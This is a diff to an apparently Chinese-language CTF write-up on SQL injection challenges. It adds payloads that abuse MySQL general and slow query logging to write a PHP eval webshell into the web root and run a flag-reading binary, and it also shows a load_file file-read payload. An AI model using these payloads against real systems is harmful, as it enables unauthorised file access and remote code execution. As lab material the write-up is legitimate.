@@ -194,3 +194,17 @@ docker run --rm -it -v $PWD:/work -w /work -u $UID:$GID brimstone/fastcoll  -o m
 ### SQL注入-015
 > 文件读写, `?id=-1' union select 1,2,(select load_file('/flag'))--+`
 ### SQL注入-016
+> 基于日志写入shell，由于 /flag的权限为400 无法直接读取，而 `/cat_flag` 可以直接运行获取 /flag的内容 故以下命令
+```text
+/index.php?id=1;set%20global%20general_log%20=%20on;set%20global%20general_log_file%20=%20%27/var/www/html/info.php%27;show%20variables%20like%20%27%general%%27;
+/index.php?id=1 and select '<?php eval($_GET[1]);?>';
+/info.php?1=system('/cat_flag');
+```
+> 或者利用慢日志查询 直接写shell
+```shell
+show variables like '%slow_query_log%';		--查看慢查询信息
+set global slow_query_log=1;				--启用慢查询日志(默认禁用)
+set global slow_query_log_file='/var/www/html/info.php';	--修改日志文件路径
+select '<?php @eval($_GET[1]);?>' or sleep(11);
+/info.php?1=system('/cat_flag');
+```
